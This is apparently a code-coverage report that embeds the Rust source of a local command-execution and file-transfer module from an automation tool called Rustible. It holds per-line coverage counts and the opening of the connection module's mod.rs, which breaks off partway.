a new local connection\n    pub fn new() -\u003e Self {\n        let identifier = hostname::get()\n            .map(|h| h.to_string_lossy().to_string())\n            .unwrap_or_else(|_| \"localhost\".to_string());\n\n        Self { identifier }\n    }\n\n    /// Create a local connection with a custom identifier\n    pub fn with_identifier(identifier: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            identifier: identifier.into(),\n        }\n    }\n\n    /// Build the command with options\n    fn build_command(\u0026self, command: \u0026str, options: \u0026ExecuteOptions) -\u003e Command {\n        let mut cmd = if options.escalate {\n            let escalate_method = options.escalate_method.as_deref().unwrap_or(\"sudo\");\n            let escalate_user = options.escalate_user.as_deref().unwrap_or(\"root\");\n\n            match escalate_method {\n                \"sudo\" =\u003e {\n                    let mut c = Command::new(\"sudo\");\n                    c.arg(\"-u\").arg(escalate_user);\n                    if options.escalate_password.is_some() {\n                        c.arg(\"-S\"); // Read password from stdin\n                    }\n                    c.arg(\"--\").arg(\"sh\").arg(\"-c\").arg(command);\n                    c\n                }\n                \"su\" =\u003e {\n                    let mut c = Command::new(\"su\");\n                    c.arg(\"-\").arg(escalate_user).arg(\"-c\").arg(command);\n                    c\n                }\n                \"doas\" =\u003e {\n                    let mut c = Command::new(\"doas\");\n                    c.arg(\"-u\")\n                        .arg(escalate_user)\n                        .arg(\"sh\")\n                        .arg(\"-c\")\n                        .arg(command);\n                    c\n                }\n                _ =\u003e {\n                    // Default to sudo\n                    let mut c = Command::new(\"sudo\");\n                    c.arg(\"-u\").arg(escalate_user);\n                    c.arg(\"--\").arg(\"sh\").arg(\"-c\").arg(command);\n                    c\n                }\n            }\n        } else {\n            let mut c = Command::new(\"sh\");\n            c.arg(\"-c\").arg(command);\n            c\n        };\n\n        // Set working directory\n        if let Some(cwd) = \u0026options.cwd {\n            cmd.current_dir(cwd);\n        }\n\n        // Set environment variables\n        for (key, value) in \u0026options.env {\n            cmd.env(key, value);\n        }\n\n        // Configure stdio\n        cmd.stdin(Stdio::piped())\n            .stdout(Stdio::piped())\n            .stderr(Stdio::piped());\n\n        cmd\n    }\n}\n\nimpl Default for LocalConnection {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n#[async_trait]\nimpl Connection for LocalConnection {\n    fn identifier(\u0026self) -\u003e \u0026str {\n        \u0026self.identifier\n    }\n\n    async fn is_alive(\u0026self) -\u003e bool {\n        // Local connection is always alive\n        true\n    }\n\n    async fn execute(\n        \u0026self,\n        command: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ConnectionResult\u003cCommandResult\u003e {\n        let options = options.unwrap_or_default();\n        debug!(command = %command, \"Executing local command\");\n\n        let mut cmd = self.build_command(command, \u0026options);\n\n        // Spawn the process\n        let mut child = cmd.spawn().map_err(|e| {\n            ConnectionError::ExecutionFailed(format!(\"Failed to spawn process: {}\", e))\n        })?;\n\n        // Handle escalation password if needed\n        if options.escalate \u0026\u0026 options.escalate_password.is_some() {\n            if let Some(mut stdin) = child.stdin.take() {\n                let password = options.escalate_password.as_ref().unwrap();\n                stdin\n                    .write_all(format!(\"{}\\n\", password).as_bytes())\n                    .await\n                    .map_err(|e| {\n                        ConnectionError::ExecutionFailed(format!(\"Failed to write password: {}\", e))\n                    })?;\n            }\n        }\n\n        // Wait for the process with optional timeout\n        let output = if let Some(timeout_secs) = options.timeout {\n            let timeout = tokio::time::Duration::from_secs(timeout_secs);\n            let wait_future = child.wait_with_output();\n            match tokio::time::timeout(timeout, wait_future).await {\n                Ok(result) =\u003e result.map_err(|e| {\n                    ConnectionError::ExecutionFailed(format!(\"Failed to wait for process: {}\", e))\n                })?,\n                Err(_) =\u003e {\n                    // Timeout occurred\n                    return Err(ConnectionError::Timeout(timeout_secs));\n                }\n            }\n        } else {\n            child.wait_with_output().await.map_err(|e| {\n                ConnectionError::ExecutionFailed(format!(\"Failed to wait for process: {}\", e))\n            })?\n        };\n\n        let exit_code = output.status.code().unwrap_or(-1);\n        let stdout = String::from_utf8_lossy(\u0026output.stdout).to_string();\n        let stderr = String::from_utf8_lossy(\u0026output.stderr).to_string();\n\n        trace!(exit_code = %exit_code, stdout_len = %stdout.len(), stderr_len = %stderr.len(), \"Command completed\");\n\n        if output.status.success() {\n            Ok(CommandResult::success(stdout, stderr))\n        } else {\n            Ok(CommandResult::failure(exit_code, stdout, stderr))\n        }\n    }\n\n    async fn upload(\n        \u0026self,\n        local_path: \u0026Path,\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n        debug!(src = %local_path.display(), dst = %remote_path.display(), \"Copying file locally\");\n\n        // Create parent directories if needed\n        if options.create_dirs {\n            if let Some(parent) = remote_path.parent() {\n                fs::create_dir_all(parent).map_err(|e| {\n                    ConnectionError::TransferFailed(format!(\n                        \"Failed to create directory {}: {}\",\n                        parent.display(),\n                        e\n                    ))\n                })?;\n            }\n        }\n\n        // Backup existing file if requested\n        if options.backup \u0026\u0026 remote_path.exists() {\n            let backup_path = format!(\"{}.bak\", remote_path.display());\n            fs::copy(remote_path, \u0026backup_path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to create backup: {}\", e))\n            })?;\n        }\n\n        // Copy the file\n        fs::copy(local_path, remote_path).map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to copy {} to {}: {}\",\n                local_path.display(),\n                remote_path.display(),\n                e\n            ))\n        })?;\n\n        // Set permissions if specified\n        if let Some(mode) = options.mode {\n            self.set_mode(remote_path, mode)?;\n        }\n\n        // Set owner/group if specified\n        if options.owner.is_some() || options.group.is_some() {\n            self.set_ownership(\n                remote_path,\n                options.owner.as_deref(),\n                options.group.as_deref(),\n            )\n            .await?;\n        }\n\n        Ok(())\n    }\n\n    async fn upload_content(\n        \u0026self,\n        content: \u0026[u8],\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n        debug!(dst = %remote_path.display(), size = %content.len(), \"Writing content locally\");\n\n        // Create parent directories if needed\n        if options.create_dirs {\n            if let Some(parent) = remote_path.parent() {\n                fs::create_dir_all(parent).map_err(|e| {\n                    ConnectionError::TransferFailed(format!(\n                        \"Failed to create directory {}: {}\",\n                        parent.display(),\n                        e\n                    ))\n                })?;\n            }\n        }\n\n        // Backup existing file if requested\n        if options.backup \u0026\u0026 remote_path.exists() {\n            let backup_path = format!(\"{}.bak\", remote_path.display());\n            fs::copy(remote_path, \u0026backup_path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to create backup: {}\", e))\n            })?;\n        }\n\n        // Write the content\n        fs::write(remote_path, content).map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to write to {}: {}\",\n                remote_path.display(),\n                e\n            ))\n        })?;\n\n        // Set permissions if specified\n        if let Some(mode) = options.mode {\n            self.set_mode(remote_path, mode)?;\n        }\n\n        // Set owner/group if specified\n        if options.owner.is_some() || options.group.is_some() {\n            self.set_ownership(\n                remote_path,\n                options.owner.as_deref(),\n                options.group.as_deref(),\n            )\n            .await?;\n        }\n\n        Ok(())\n    }\n\n    async fn download(\u0026self, remote_path: \u0026Path, local_path: \u0026Path) -\u003e ConnectionResult\u003c()\u003e {\n        debug!(src = %remote_path.display(), dst = %local_path.display(), \"Copying file locally\");\n\n        // Create parent directories for destination\n        if let Some(parent) = local_path.parent() {\n            fs::create_dir_all(parent).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to create directory {}: {}\",\n                    parent.display(),\n                    e\n                ))\n            })?;\n        }\n\n        fs::copy(remote_path, local_path).map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to copy {} to {}: {}\",\n                remote_path.display(),\n                local_path.display(),\n                e\n            ))\n        })?;\n\n        Ok(())\n    }\n\n    async fn download_content(\u0026self, remote_path: \u0026Path) -\u003e ConnectionResult\u003cVec\u003cu8\u003e\u003e {\n        debug!(src = %remote_path.display(), \"Reading file content locally\");\n\n        fs::read(remote_path).map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to read {}: {}\",\n                remote_path.display(),\n                e\n            ))\n        })\n    }\n\n    async fn path_exists(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        Ok(path.exists())\n    }\n\n    async fn is_directory(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        Ok(path.is_dir())\n    }\n\n    async fn stat(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cFileStat\u003e {\n        let metadata = fs::metadata(path).map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to stat {}: {}\", path.display(), e))\n        })?;\n\n        Ok(FileStat {\n            size: metadata.len(),\n            mode: metadata.mode(),\n            uid: metadata.uid(),\n            gid: metadata.gid(),\n            atime: metadata.atime(),\n            mtime: metadata.mtime(),\n            is_dir: metadata.is_dir(),\n            is_file: metadata.is_file(),\n            is_symlink: metadata.is_symlink(),\n        })\n    }\n\n    async fn close(\u0026self) -\u003e ConnectionResult\u003c()\u003e {\n        // Nothing to close for local connection\n        Ok(())\n    }\n}\n\nimpl LocalConnection {\n    /// Set file mode/permissions\n    fn set_mode(\u0026self, path: \u0026Path, mode: u32) -\u003e ConnectionResult\u003c()\u003e {\n        use std::os::unix::fs::PermissionsExt;\n\n        let permissions = fs::Permissions::from_mode(mode);\n        fs::set_permissions(path, permissions).map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to set permissions on {}: {}\",\n                path.display(),\n                e\n            ))\n        })\n    }\n\n    /// Set file ownership\n    async fn set_ownership(\n        \u0026self,\n        path: \u0026Path,\n        owner: Option\u003c\u0026str\u003e,\n        group: Option\u003c\u0026str\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        // Build chown command\n        let ownership = match (owner, group) {\n            (Some(o), Some(g)) =\u003e format!(\"{}:{}\", o, g),\n            (Some(o), None) =\u003e o.to_string(),\n            (None, Some(g)) =\u003e format!(\":{}\", g),\n            (None, None) =\u003e return Ok(()),\n        };\n\n        let command = format!(\"chown {} {}\", ownership, path.display());\n        let result = self\n            .execute(\n                \u0026command,\n                Some(ExecuteOptions::new().with_escalation(Some(\"root\".to_string()))),\n            )\n            .await?;\n\n        if !result.success {\n            return Err(ConnectionError::TransferFailed(format!(\n                \"Failed to set ownership: {}\",\n                result.stderr\n            )));\n        }\n\n        Ok(())\n    }\n}\n\n/// Execute a one-off local command\npub async fn execute_local(command: \u0026str) -\u003e ConnectionResult\u003cCommandResult\u003e {\n    let conn = LocalConnection::new();\n    conn.execute(command, None).await\n}\n\n/// Execute a one-off local command with options\npub async fn execute_local_with_options(\n    command: \u0026str,\n    options: ExecuteOptions,\n) -\u003e ConnectionResult\u003cCommandResult\u003e {\n    let conn = LocalConnection::new();\n    conn.execute(command, Some(options)).await\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[tokio::test]\n    async fn test_local_execute() {\n        let conn = LocalConnection::new();\n        let result = conn.execute(\"echo 'hello world'\", None).await.unwrap();\n\n        assert!(result.success);\n        assert!(result.stdout.contains(\"hello world\"));\n    }\n\n    #[tokio::test]\n    async fn test_local_execute_with_env() {\n        let conn = LocalConnection::new();\n        let options = ExecuteOptions::new().with_env(\"TEST_VAR\", \"test_value\");\n        let result = conn.execute(\"echo $TEST_VAR\", Some(options)).await.unwrap();\n\n        assert!(result.success);\n        assert!(result.stdout.contains(\"test_value\"));\n    }\n\n    #[tokio::test]\n    async fn test_local_execute_with_cwd() {\n        let conn = LocalConnection::new();\n        let options = ExecuteOptions::new().with_cwd(\"/tmp\");\n        let result = conn.execute(\"pwd\", Some(options)).await.unwrap();\n\n        assert!(result.success);\n        assert!(result.stdout.contains(\"/tmp\"));\n    }\n\n    #[tokio::test]\n    async fn test_local_execute_failure() {\n        let conn = LocalConnection::new();\n        let result = conn.execute(\"exit 42\", None).await.unwrap();\n\n        assert!(!result.success);\n        assert_eq!(result.exit_code, 42);\n    }\n\n    #[tokio::test]\n    async fn test_local_timeout() {\n        let conn = LocalConnection::new();\n        let options = ExecuteOptions::new().with_timeout(1);\n        let result = conn.execute(\"sleep 10\", Some(options)).await;\n\n        assert!(matches!(result, Err(ConnectionError::Timeout(1))));\n    }\n\n    #[tokio::test]\n    async fn test_local_path_exists() {\n        let conn = LocalConnection::new();\n\n        assert!(conn.path_exists(Path::new(\"/tmp\")).await.unwrap());\n        assert!(!conn\n            .path_exists(Path::new(\"/nonexistent/path\"))\n            .await\n            .unwrap());\n    }\n\n    #[tokio::test]\n    async fn test_local_is_directory() {\n        let conn = LocalConnection::new();\n\n        assert!(conn.is_directory(Path::new(\"/tmp\")).await.unwrap());\n        assert!(!conn.is_directory(Path::new(\"/etc/passwd\")).await.unwrap());\n    }\n\n    #[tokio::test]\n    async fn test_local_upload_download() {\n        let conn = LocalConnection::new();\n        let temp_dir = tempfile::tempdir().unwrap();\n\n        let src_path = temp_dir.path().join(\"source.txt\");\n        let dst_path = temp_dir.path().join(\"dest.txt\");\n\n        // Create source file\n        fs::write(\u0026src_path, b\"test content\").unwrap();\n\n        // Upload\n        conn.upload(\u0026src_path, \u0026dst_path, None).await.unwrap();\n        assert!(dst_path.exists());\n\n        // Download content\n        let content = conn.download_content(\u0026dst_path).await.unwrap();\n        assert_eq!(content, b\"test content\");\n    }\n\n    #[tokio::test]\n    async fn test_local_upload_content() {\n        let conn = LocalConnection::new();\n        let temp_dir = tempfile::tempdir().unwrap();\n        let dst_path = temp_dir.path().join(\"content.txt\");\n\n        conn.upload_content(b\"direct content\", \u0026dst_path, None)\n            .await\n            .unwrap();\n\n        assert!(dst_path.exists());\n        let content = fs::read_to_string(\u0026dst_path).unwrap();\n        assert_eq!(content, \"direct content\");\n    }\n\n    #[tokio::test]\n    async fn test_local_stat() {\n        let conn = LocalConnection::new();\n        let temp_dir = tempfile::tempdir().unwrap();\n        let file_path = temp_dir.path().join(\"test_file.txt\");\n\n        fs::write(\u0026file_path, b\"some content\").unwrap();\n\n        let stat = conn.stat(\u0026file_path).await.unwrap();\n        assert!(stat.is_file);\n        assert!(!stat.is_dir);\n        assert_eq!(stat.size, 12); // \"some content\" = 12 bytes\n    }\n\n    #[tokio::test]\n    async fn test_local_is_alive() {\n        let conn = LocalConnection::new();\n        assert!(conn.is_alive().await);\n    }\n}\n","traces":[{"line":29,"address":[32028720],"length":1,"stats":{"Line":1}},{"line":30,"address":[32028733],"length":1,"stats":{"Line":1}},{"line":31,"address":[32028744],"length":1,"stats":{"Line":3}},{"line":32,"address":[27775280,27775296],"length":1,"stats":{"Line":1}},{"line":38,"address":[],"length":0,"stats":{"Line":0}},{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[32026905,32026368,32026899],"length":1,"stats":{"Line":1}},{"line":46,"address":[32026447],"length":1,"stats":{"Line":1}},{"line":47,"address":[32026547],"length":1,"stats":{"Line":0}},{"line":48,"address":[32026621],"length":1,"stats":{"Line":0}},{"line":51,"address":[32026703],"length":1,"stats":{"Line":0}},{"line":52,"address":[32026957],"length":1,"stats":{"Line":0}},{"line":53,"address":[32026998,32027956],"length":1,"stats":{"Line":0}},{"line":54,"address":[32027971],"length":1,"stats":{"Line":0}},{"line":55,"address":[32028032],"length":1,"stats":{"Line":0}},{"line":57,"address":[32028066,32028000],"length":1,"stats":{"Line":0}},{"line":58,"address":[32028147],"length":1,"stats":{"Line":0}},{"line":60,"address":[32026934],"length":1,"stats":{"Line":0}},{"line":61,"address":[32027071],"length":1,"stats":{"Line":0}},{"line":62,"address":[32027112,32027788],"length":1,"stats":{"Line":0}},{"line":63,"address":[32027857],"length":1,"stats":{"Line":0}},{"line":65,"address":[32027044],"length":1,"stats":{"Line":0}},{"line":66,"address":[32027210],"length":1,"stats":{"Line":0}},{"line":67,"address":[32027251],"length":1,"stats":{"Line":0}},{"line":68,"address":[32027591],"length":1,"stats":{"Line":0}},{"line":71,"address":[32027682],"length":1,"stats":{"Line":0}},{"line":72,"address":[32027689],"length":1,"stats":{"Line":0}},{"line":76,"address":[32027142],"length":1,"stats":{"Line":0}},{"line":77,"address":[32027183,32027349],"length":1,"stats":{"Line":0}},{"line":78,"address":[32027356],"length":1,"stats":{"Line":0}},{"line":79,"address":[32027492],"length":1,"stats":{"Line":0}},{"line":83,"address":[32026457],"length":1,"stats":{"Line":1}},{"line":84,"address":[32026514,32026801],"length":1,"stats":{"Line":2}},{"line":85,"address":[32026808],"length":1,"stats":{"Line":1}},{"line":89,"address":[32028186,32026842],"length":1,"stats":{"Line":2}},{"line":90,"address":[32028202,32028284],"length":1,"stats":{"Line":2}},{"line":94,"address":[32028217,32028286],"length":1,"stats":{"Line":2}},{"line":95,"address":[32028438,32028606],"length":1,"stats":{"Line":2}},{"line":99,"address":[32028448],"length":1,"stats":{"Line":1}},{"line":100,"address":[32028491],"length":1,"stats":{"Line":1}},{"line":101,"address":[32028531],"length":1,"stats":{"Line":1}},{"line":103,"address":[32028572],"length":1,"stats":{"Line":1}},{"line":108,"address":[32026304],"length":1,"stats":{"Line":0}},{"line":109,"address":[32026312],"length":1,"stats":{"Line":0}},{"line":115,"address":[32037152],"length":1,"stats":{"Line":0}},{"line":116,"address":[32037157],"length":1,"stats":{"Line":0}},{"line":119,"address":[27801220,27801104,27801128,27801195,27801202],"length":1,"stats":{"Line":5}},{"line":124,"address":[32037812],"length":1,"stats":{"Line":7}},{"line":129,"address":[27791135],"length":1,"stats":{"Line":1}},{"line":130,"address":[27791302,27791624,27791223],"length":1,"stats":{"Line":2}},{"line":132,"address":[27791583],"length":1,"stats":{"Line":1}},{"line":135,"address":[27797993,27791912,27797744,27797987,27792098,27793001,27792008],"length":1,"stats":{"Line":2}},{"line":136,"address":[27797771,27797839],"length":1,"stats":{"Line":0}},{"line":140,"address":[27792252,27792205,27792332],"length":1,"stats":{"Line":1}},{"line":141,"address":[27792346],"length":1,"stats":{"Line":0}},{"line":142,"address":[27792449,27792542],"length":1,"stats":{"Line":0}},{"line":143,"address":[27792609,27793202,27793316,27792926,27793249],"length":1,"stats":{"Line":0}},{"line":144,"address":[27792888,27792626],"length":1,"stats":{"Line":0}},{"line":145,"address":[27792979,27793073,27792911,27790942],"length":1,"stats":{"Line":0}},{"line":146,"address":[27797625,27797619,27797376,27793226],"length":1,"stats":{"Line":0}},{"line":147,"address":[27797403,27797471],"length":1,"stats":{"Line":0}},{"line":153,"address":[27793412,27795156,27792222],"length":1,"stats":{"Line":3}},{"line":154,"address":[27793560,27793426],"length":1,"stats":{"Line":2}},{"line":155,"address":[27793595],"length":1,"stats":{"Line":1}},{"line":156,"address":[27793681,27790963,27793989],"length":1,"stats":{"Line":2}},{"line":157,"address":[27794393,27794686,27798265,27798259,27794572,27798016],"length":1,"stats":{"Line":0}},{"line":158,"address":[27798111,27798043],"length":1,"stats":{"Line":0}},{"line":162,"address":[27794279],"length":1,"stats":{"Line":1}},{"line":166,"address":[26087555],"length":1,"stats":{"Line":3}},{"line":167,"address":[27797199,27797131],"length":1,"stats":{"Line":0}},{"line":171,"address":[27795215,27794654],"length":1,"stats":{"Line":2}},{"line":172,"address":[27795326,27795252],"length":1,"stats":{"Line":2}},{"line":173,"address":[27795481,27795552],"length":1,"stats":{"Line":2}},{"line":175,"address":[27795707,27795977],"length":1,"stats":{"Line":1}},{"line":177,"address":[27795955,27796735,27796417],"length":1,"stats":{"Line":3}},{"line":178,"address":[27796709,27796541],"length":1,"stats":{"Line":2}},{"line":180,"address":[27796423,27796652],"length":1,"stats":{"Line":2}},{"line":184,"address":[27789375,27788856,27786223,27785760,27789300,27785807,27785915,27786197,27789390],"length":1,"stats":{"Line":4}},{"line":190,"address":[27786170],"length":1,"stats":{"Line":1}},{"line":191,"address":[27786339,27786263,27786630],"length":1,"stats":{"Line":2}},{"line":194,"address":[27786612],"length":1,"stats":{"Line":1}},{"line":195,"address":[27787138,27787459],"length":1,"stats":{"Line":0}},{"line":196,"address":[27789840,27787464,27789846,27787288,27789456,27787429],"length":1,"stats":{"Line":0}},{"line":197,"address":[27789612],"length":1,"stats":{"Line":0}},{"line":199,"address":[27789520,27789588],"length":1,"stats":{"Line":0}},{"line":207,"address":[27787546,27787112],"length":1,"stats":{"Line":1}},{"line":208,"address":[27787589],"length":1,"stats":{"Line":0}},{"line":209,"address":[27787789,27787974,27787884,27790675,27790432,27790681],"length":1,"stats":{"Line":0}},{"line":210,"address":[27790527,27790459],"length":1,"stats":{"Line":0}},{"line":215,"address":[27788829,27789920,27787496,27788069,27790400,27788223],"length":1,"stats":{"Line":2}},{"line":216,"address":[27790102],"length":1,"stats":{"Line":0}},{"line":218,"address":[27789947,27790027],"length":1,"stats":{"Line":0}},{"line":219,"address":[27790043],"length":1,"stats":{"Line":0}},{"line":225,"address":[27788488,27788280],"length":1,"stats":{"Line":1}},{"line":226,"address":[27788325,27788493,27788391],"length":1,"stats":{"Line":0}},{"line":230,"address":[27788356,27788502,27788590,27789207],"length":1,"stats":{"Line":3}},{"line":231,"address":[27788777,27789045,27788721,27789174,27789362,27789107],"length":1,"stats":{"Line":0}},{"line":232,"address":[27788543],"length":1,"stats":{"Line":0}},{"line":233,"address":[27788561],"length":1,"stats":{"Line":0}},{"line":234,"address":[27788658],"length":1,"stats":{"Line":0}},{"line":236,"address":[27789142,27788762,27785945,27788810,27789077,27788896],"length":1,"stats":{"Line":0}},{"line":239,"address":[27788604],"length":1,"stats":{"Line":1}},{"line":242,"address":[27781249,27781264,27777760,27777807,27778223,27781174,27780730,27777915,27778197],"length":1,"stats":{"Line":4}},{"line":248,"address":[27778170],"length":1,"stats":{"Line":1}},{"line":249,"address":[27778339,27778630,27778263],"length":1,"stats":{"Line":2}},{"line":252,"address":[27778612],"length":1,"stats":{"Line":1}},{"line":253,"address":[27779415,27779094],"length":1,"stats":{"Line":0}},{"line":254,"address":[27779385,27779420,27779244,27781376,27781766,27781760],"length":1,"stats":{"Line":0}},{"line":255,"address":[27781532],"length":1,"stats":{"Line":0}},{"line":257,"address":[27781440,27781508],"length":1,"stats":{"Line":0}},{"line":265,"address":[27779498,27779068],"length":1,"stats":{"Line":1}},{"line":266,"address":[27779541],"length":1,"stats":{"Line":0}},{"line":267,"address":[27782451,27782457,27779735,27779920,27782208,27779830],"length":1,"stats":{"Line":0}},{"line":268,"address":[27782303,27782235],"length":1,"stats":{"Line":0}},{"line":273,"address":[27782176,27780113,27782182,27780007,27779452,27780703,27781792],"length":1,"stats":{"Line":2}},{"line":274,"address":[27781948],"length":1,"stats":{"Line":0}},{"line":276,"address":[27781856,27781924],"length":1,"stats":{"Line":0}},{"line":282,"address":[27780362,27780154],"length":1,"stats":{"Line":1}},{"line":283,"address":[27780367,27780199,27780265],"length":1,"stats":{"Line":0}},{"line":287,"address":[27780376,27780230,27780464,27781081],"length":1,"stats":{"Line":3}},{"line":288,"address":[27780595,27781236,27780919,27780981,27780651,27781048],"length":1,"stats":{"Line":0}},{"line":289,"address":[27780417],"length":1,"stats":{"Line":0}},{"line":290,"address":[27780435],"length":1,"stats":{"Line":0}},{"line":291,"address":[27780532],"length":1,"stats":{"Line":0}},{"line":293,"address":[26099248],"length":1,"stats":{"Line":0}},{"line":296,"address":[27780478],"length":1,"stats":{"Line":1}},{"line":299,"address":[27798288,27798641,27798575,27798415,27798335,27798708,27800091,27800101],"length":1,"stats":{"Line":0}},{"line":300,"address":[27798586,27798754,27799059],"length":1,"stats":{"Line":0}},{"line":303,"address":[27799495,27799787,27799027],"length":1,"stats":{"Line":0}},{"line":304,"address":[27799667,27799584,27800688,27801078,27799792,27799757,27801072],"length":1,"stats":{"Line":0}},{"line":305,"address":[27800844],"length":1,"stats":{"Line":0}},{"line":307,"address":[27800752,27800820],"length":1,"stats":{"Line":0}},{"line":313,"address":[27799969,27799815,27800096,27800608,27800128,27799608],"length":1,"stats":{"Line":0}},{"line":314,"address":[27800310],"length":1,"stats":{"Line":0}},{"line":316,"address":[27800235,27800155],"length":1,"stats":{"Line":0}},{"line":317,"address":[27800251],"length":1,"stats":{"Line":0}},{"line":322,"address":[27800015],"length":1,"stats":{"Line":0}},{"line":325,"address":[27782480,27782518,27782586,27782855,27782733,27782740,27782791,27783559],"length":1,"stats":{"Line":6}},{"line":326,"address":[27782898,27783152,27782751],"length":1,"stats":{"Line":2}},{"line":328,"address":[27783990,27783464,27783126,27783600,27783984],"length":1,"stats":{"Line":2}},{"line":329,"address":[27783756],"length":1,"stats":{"Line":0}},{"line":331,"address":[27783664,27783732],"length":1,"stats":{"Line":0}},{"line":337,"address":[32037187],"length":1,"stats":{"Line":6}},{"line":338,"address":[27777019,27777160],"length":1,"stats":{"Line":2}},{"line":341,"address":[27777481,27777717,27777488,27777367,27777537,27777601,27777264,27777302],"length":1,"stats":{"Line":6}},{"line":342,"address":[27777644,27777499],"length":1,"stats":{"Line":2}},{"line":345,"address":[27784246,27784942,27784289,27784064,27784102,27784168,27784334,27784952],"length":1,"stats":{"Line":6}},{"line":346,"address":[27784257,27784947,27784492,27784378,27784992,27785376,27785382],"length":1,"stats":{"Line":2}},{"line":347,"address":[27785056,27785124],"length":1,"stats":{"Line":0}},{"line":350,"address":[27784813],"length":1,"stats":{"Line":1}},{"line":351,"address":[27784605],"length":1,"stats":{"Line":1}},{"line":352,"address":[27784625],"length":1,"stats":{"Line":1}},{"line":353,"address":[27784644],"length":1,"stats":{"Line":1}},{"line":354,"address":[27784663],"length":1,"stats":{"Line":1}},{"line":355,"address":[27784682],"length":1,"stats":{"Line":1}},{"line":356,"address":[27784702],"length":1,"stats":{"Line":1}},{"line":357,"address":[27784722],"length":1,"stats":{"Line":1}},{"line":358,"address":[27784741],"length":1,"stats":{"Line":1}},{"line":359,"address":[27784760],"length":1,"stats":{"Line":1}},{"line":363,"address":[32037577],"length":1,"stats":{"Line":0}},{"line":365,"address":[27785612],"length":1,"stats":{"Line":0}},{"line":371,"address":[32028832],"length":1,"stats":{"Line":0}},{"line":374,"address":[32028887],"length":1,"stats":{"Line":0}},{"line":375,"address":[32028908],"length":1,"stats":{"Line":0}},{"line":376,"address":[27775548],"length":1,"stats":{"Line":0}},{"line":378,"address":[27775456,27775524],"length":1,"stats":{"Line":0}},{"line":385,"address":[32028624],"length":1,"stats":{"Line":0}},{"line":392,"address":[27772599,27772707],"length":1,"stats":{"Line":0}},{"line":393,"address":[27773143,27773318],"length":1,"stats":{"Line":0}},{"line":394,"address":[27773266],"length":1,"stats":{"Line":0}},{"line":395,"address":[27772990,27772778],"length":1,"stats":{"Line":0}},{"line":396,"address":[27772848],"length":1,"stats":{"Line":0}},{"line":399,"address":[27773114,27773533],"length":1,"stats":{"Line":0}},{"line":400,"address":[27774576,27775039,27774409,27774500,27774159],"length":1,"stats":{"Line":0}},{"line":402,"address":[27773747],"length":1,"stats":{"Line":0}},{"line":403,"address":[27773844,27774190,27773851,27773922],"length":1,"stats":{"Line":0}},{"line":405,"address":[27774258,27774124,27774175,27772694,27774473,27774544],"length":1,"stats":{"Line":0}},{"line":407,"address":[27774661],"length":1,"stats":{"Line":0}},{"line":408,"address":[27774671,27774776],"length":1,"stats":{"Line":0}},{"line":414,"address":[27774706],"length":1,"stats":{"Line":0}},{"line":419,"address":[27771796,27771838,27771715,27771680,27772035],"length":1,"stats":{"Line":0}},{"line":420,"address":[27771785],"length":1,"stats":{"Line":0}},{"line":421,"address":[27771823,27772072,27771892,27771975],"length":1,"stats":{"Line":0}},{"line":425,"address":[32028960],"length":1,"stats":{"Line":0}},{"line":429,"address":[27775973],"length":1,"stats":{"Line":0}},{"line":430,"address":[27776375,27776017,27776080,27776268],"length":1,"stats":{"Line":0}}],"covered":74,"coverable":186},{"path":["/","home","artur","Repositories","rustible","src","connection","mod.rs"],"content":"//! Connection module for Rustible\n//!\n//! This module provides a unified interface for executing commands and transferring\n//! files across different transport mechanisms (SSH, local, Docker).\n\npub mod config;\npub mod docker;\npub mod local;\n#[cfg(feature = \"russh\")]\npub mod russh;\n// russh_auth: Advanced authentication module (currently disabled)\n// The russh_auth module was designed for advanced authentication scenarios but\n// needs updating for russh 0.45 API changes (Signer trait, AuthResult enum).\n// Core authentication (agent, key, password) is implemented directly in russh.rs.\n// If advanced features are needed, this module can be updated later.\n// #[cfg(feature = \"russh\")]\n// pub mod russh_auth;\n#[cfg(feature = \"russh\")]\npub mod russh_pool;\n#[cfg(feature = \"ssh2-backend\")]\npub mod ssh;\n\nuse async_trait::async_trait;\nuse parking_lot::RwLock;\nuse std::collections::HashMap;\nuse std::path::Path;\nuse std::sync::Arc;\nuse thiserror::Error;\n\n// Re-export config types at module level for convenience\npub use crate::config::SshConfig;\npub use config::{ConnectionConfig, HostConfig};\n#[cfg(feature = \"ssh2-backend\")]\npub use ssh::{SshConnection, SshConnectionBuilder};\n\n// Re-export russh types when the feature is enabled\n#[cfg(feature = \"russh\")]\npub use russh::{PendingCommand, PipelinedExecutor, RusshConnection, RusshConnectionBuilder};\n// TODO: russh_auth needs updating for russh 0.45 API changes\n// #[cfg(feature = \"russh\")]\n// pub use russh_auth::{\n//     AuthConfig, AuthMethod, AuthResult, RusshAuthenticator, RusshClientHandler,\n//     KeyLoader, KeyType, KeyError, KeyInfo,\n//     connect_to_agent, load_private_key, load_private_key_from_string,\n//     default_identity_files, standard_key_locations, is_key_encrypted,\n// };\n#[cfg(feature = \"russh\")]\npub use russh_pool::{\n    PoolConfig, PoolStats as RusshPoolStats, PooledConnectionHandle, RusshConnectionPool,\n    RusshConnectionPoolBuilder,\n};\n\n/// Russh-related error type - wraps russh::Error for compatibility with the Handler trait\n#[cfg(feature = 